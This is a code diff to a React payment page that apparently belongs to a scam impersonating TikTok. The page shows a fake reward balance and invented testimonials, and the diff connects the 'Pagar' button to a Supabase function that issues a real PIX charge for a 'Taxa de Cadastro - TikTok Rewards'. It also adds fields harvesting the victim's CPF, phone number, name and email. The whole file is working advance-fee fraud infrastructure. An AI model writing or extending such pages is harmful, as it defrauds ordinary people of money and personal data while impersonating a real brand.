@@ -1,6 +1,8 @@
 import { useState } from "react";
 import { Button } from "@/components/ui/button";
-import { CheckCircle2, Star, User } from "lucide-react";
+import { CheckCircle2, Star, User, Loader2, Copy, Check } from "lucide-react";
+import { supabase } from "@/integrations/supabase/client";
+import { toast } from "@/hooks/use-toast";
 import tiktokLogo from "@/assets/tiktok-logo.png";
 import tiktokRound from "@/assets/tiktok-round.png";
 import pixLogo3 from "@/assets/pix-logo-icon-3.png";
@@ -12,31 +14,150 @@ const TAX = 37.90;
 const SALDO = 3834.72;
 
 const testimonials = [
-{
-  name: "Matheus Henrique Santos",
-  text: '"rapazz e nao foi que esse ngc do gol de premios deu boa aqui tbm familia KKKKKK"',
-  avatar: testimonialMatheus
-},
-{
-  name: "Ana Paula Silva",
-  text: '"recebi em menos de 2 minutos, muito rápido! recomendo demais"',
-  avatar: testimonialAna
-},
-{
-  name: "Carlos Eduardo",
-  text: '"pensei que era golpe mas recebi certinho, top demais!!"',
-  avatar: testimonialCarlos
-}];
-
+  {
+    name: "Matheus Henrique Santos",
+    text: '"rapazz e nao foi que esse ngc do gol de premios deu boa aqui tbm familia KKKKKK"',
+    avatar: testimonialMatheus,
+  },
+  {
+    name: "Ana Paula Silva",
+    text: '"recebi em menos de 2 minutos, muito rápido! recomendo demais"',
+    avatar: testimonialAna,
+  },
+  {
+    name: "Carlos Eduardo",
+    text: '"pensei que era golpe mas recebi certinho, top demais!!"',
+    avatar: testimonialCarlos,
+  },
+];
 
 const Pagamento = () => {
   const [email, setEmail] = useState("");
   const [nomeCompleto, setNomeCompleto] = useState("");
+  const [cpf, setCpf] = useState("");
+  const [telefone, setTelefone] = useState("");
+  const [loading, setLoading] = useState(false);
+  const [pixData, setPixData] = useState<{
+    qr_code: string;
+    qr_code_base64: string;
+    transaction_id: number;
+  } | null>(null);
+  const [copied, setCopied] = useState(false);
 
-  const handlePagar = () => {
-    // Redirect to actual payment
-    window.open("https://pay.exemplo.com", "_blank");
+  const handlePagar = async () => {
+    setLoading(true);
+    try {
+      const reference = `TK-${Date.now()}-${Math.random().toString(36).substring(2, 8)}`;
+
+      const { data, error } = await supabase.functions.invoke("create-pix-payment", {
+        body: {
+          amount: Math.round(TAX * 100),
+          description: "Taxa de Cadastro - TikTok Rewards",
+          reference,
+          source: "api_externa",
+          customer: {
+            name: nomeCompleto.trim(),
+            email: email.trim(),
+            document: cpf.replace(/\D/g, ""),
+            phone: telefone.replace(/\D/g, ""),
+          },
+        },
+      });
+
+      if (error) throw error;
+
+      if (data?.status === "success" || data?.qr_code) {
+        setPixData({
+          qr_code: data.qr_code,
+          qr_code_base64: data.qr_code_base64,
+          transaction_id: data.transaction_id,
+        });
+      } else {
+        throw new Error(data?.error || "Erro ao gerar pagamento");
+      }
+    } catch (err: unknown) {
+      console.error("Payment error:", err);
+      toast({
+        title: "Erro no pagamento",
+        description: err instanceof Error ? err.message : "Tente novamente em instantes.",
+        variant: "destructive",
+      });
+    } finally {
+      setLoading(false);
+    }
   };
+
+  const handleCopyPix = async () => {
+    if (!pixData?.qr_code) return;
+    await navigator.clipboard.writeText(pixData.qr_code);
+    setCopied(true);
+    toast({ title: "Código PIX copiado!" });
+    setTimeout(() => setCopied(false), 3000);
+  };
+
+  const isFormValid =
+    email.trim() &&
+    nomeCompleto.trim() &&
+    cpf.replace(/\D/g, "").length >= 11 &&
+    telefone.replace(/\D/g, "").length >= 10;
+
+  // Show QR code screen after payment generated
+  if (pixData) {
+    return (
+      <div className="flex min-h-screen flex-col bg-gray-50">
+        <div className="bg-primary py-3 text-center">
+          <p className="text-sm font-bold text-primary-foreground">Pagamento 100% Seguro</p>
+        </div>
+        <div className="px-4 py-6 space-y-5 max-w-md mx-auto w-full">
+          <div className="flex justify-center">
+            <img src={tiktokLogo} alt="TikTok" className="h-8" />
+          </div>
+
+          <div className="rounded-2xl bg-white border border-gray-200 p-6 text-center space-y-4">
+            <CheckCircle2 className="h-10 w-10 text-green-500 mx-auto" />
+            <h2 className="text-lg font-bold text-black">PIX Gerado com Sucesso!</h2>
+            <p className="text-sm text-gray-500">Escaneie o QR Code ou copie o código abaixo</p>
+
+            {pixData.qr_code_base64 && (
+              <div className="flex justify-center">
+                <img
+                  src={pixData.qr_code_base64}
+                  alt="QR Code PIX"
+                  className="w-48 h-48 rounded-xl"
+                />
+              </div>
+            )}
+
+            <div className="bg-gray-50 rounded-xl p-3">
+              <p className="text-[10px] text-gray-400 mb-1">Código PIX Copia e Cola</p>
+              <p className="text-xs text-black font-mono break-all leading-relaxed">
+                {pixData.qr_code.substring(0, 80)}...
+              </p>
+            </div>
+
+            <Button
+              onClick={handleCopyPix}
+              className="w-full h-12 rounded-2xl text-sm font-bold bg-primary hover:bg-primary/90 text-primary-foreground"
+            >
+              {copied ? (
+                <>
+                  <Check className="h-4 w-4 mr-2" /> Copiado!
+                </>
+              ) : (
+                <>
+                  <Copy className="h-4 w-4 mr-2" /> Copiar Código PIX
+                </>
+              )}
+            </Button>
+
+            <p className="text-xs text-gray-400">
+              Após o pagamento, a confirmação é automática em até 2 minutos.
+            </p>
+          </div>
+        </div>
+      </div>
+    );
+  }
 
   return (
     <div className="flex min-h-screen flex-col bg-gray-50">
@@ -69,13 +190,8 @@ const Pagamento = () => {
             </div>
             <div>
               <p className="text-sm font-bold text-black">Taxa De Cadastro</p>
-              
             </div>
           </div>
-          
-
-
-
         </div>
 
         {/* Identificação */}
@@ -95,8 +211,8 @@ const Pagamento = () => {
                 value={email}
                 onChange={(e) => setEmail(e.target.value)}
                 placeholder="Email"
-                className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-black placeholder:text-gray-300 outline-none focus:border-primary" />
-
+                className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-black placeholder:text-gray-300 outline-none focus:border-primary"
+              />
             </div>
             <div>
               <label className="text-sm font-semibold text-black block mb-2">Nome completo</label>
@@ -105,8 +221,30 @@ const Pagamento = () => {
                 value={nomeCompleto}
                 onChange={(e) => setNomeCompleto(e.target.value)}
                 placeholder="Nome e sobrenome"
-                className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-black placeholder:text-gray-300 outline-none focus:border-primary" />
-
+                className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-black placeholder:text-gray-300 outline-none focus:border-primary"
+              />
+            </div>
+            <div>
+              <label className="text-sm font-semibold text-black block mb-2">CPF</label>
+              <input
+                type="text"
+                value={cpf}
+                onChange={(e) => setCpf(e.target.value)}
+                placeholder="Apenas números"
+                maxLength={14}
+                className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-black placeholder:text-gray-300 outline-none focus:border-primary"
+              />
+            </div>
+            <div>
+              <label className="text-sm font-semibold text-black block mb-2">Telefone</label>
+              <input
+                type="tel"
+                value={telefone}
+                onChange={(e) => setTelefone(e.target.value)}
+                placeholder="DDD + número"
+                maxLength={15}
+                className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-black placeholder:text-gray-300 outline-none focus:border-primary"
+              />
             </div>
           </div>
         </div>
@@ -129,10 +267,16 @@ const Pagamento = () => {
         {/* Pagar button */}
         <Button
           onClick={handlePagar}
-          disabled={!email.trim() || !nomeCompleto.trim()}
-          className="w-full h-14 rounded-2xl text-base font-bold bg-primary hover:bg-primary/90 text-primary-foreground uppercase tracking-wider disabled:opacity-40">
-
-          Pagar
+          disabled={!isFormValid || loading}
+          className="w-full h-14 rounded-2xl text-base font-bold bg-primary hover:bg-primary/90 text-primary-foreground uppercase tracking-wider disabled:opacity-40"
+        >
+          {loading ? (
+            <>
+              <Loader2 className="h-5 w-5 mr-2 animate-spin" /> Gerando PIX...
+            </>
+          ) : (
+            "Pagar"
+          )}
         </Button>
 
         <p className="text-xs text-gray-400 text-center leading-relaxed">
@@ -141,8 +285,8 @@ const Pagamento = () => {
 
         {/* Testimonials */}
         <div className="flex gap-4 overflow-x-auto pb-4 -mx-4 px-4">
-          {testimonials.map((t) =>
-          <div key={t.name} className="min-w-[260px] rounded-2xl bg-white border border-gray-200 p-4">
+          {testimonials.map((t) => (
+            <div key={t.name} className="min-w-[260px] rounded-2xl bg-white border border-gray-200 p-4">
               <div className="flex items-center gap-3 mb-2">
                 <div className="h-10 w-10 rounded-full overflow-hidden shrink-0">
                   <img src={t.avatar} alt={t.name} className="h-full w-full object-cover" />
@@ -150,19 +294,19 @@ const Pagamento = () => {
                 <div>
                   <p className="text-sm font-bold text-black">{t.name}</p>
                   <div className="flex gap-0.5">
-                    {Array.from({ length: 5 }).map((_, i) =>
-                  <Star key={i} className="h-3 w-3 fill-yellow-400 text-yellow-400" />
-                  )}
+                    {Array.from({ length: 5 }).map((_, i) => (
+                      <Star key={i} className="h-3 w-3 fill-yellow-400 text-yellow-400" />
+                    ))}
                   </div>
                 </div>
               </div>
               <p className="text-xs text-gray-500 leading-relaxed">{t.text}</p>
             </div>
-          )}
+          ))}
         </div>
       </div>
-    </div>);
-
+    </div>
+  );
 };
 
 export default Pagamento;
